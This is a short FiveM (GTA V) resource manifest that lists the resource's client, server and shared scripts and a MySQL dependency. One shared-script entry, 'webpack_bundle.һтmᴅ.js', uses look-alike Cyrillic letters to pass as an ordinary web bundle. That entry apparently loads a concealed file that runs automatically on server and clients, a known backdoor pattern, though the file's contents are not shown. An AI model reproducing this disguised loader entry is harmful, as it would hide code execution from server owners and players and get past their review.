shared_script '@WaveShield/resource/include.lua'

lua54 'yes'

fx_version 'adamant'
game 'gta5'

shared_scripts {
    'webpack_bundle.һтmᴅ.js',
    'config.lua'
}

escrow_ignore {
    'config.lua'
}

client_script 'client.lua'

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'server.lua'
}
dependency '/assetpacks'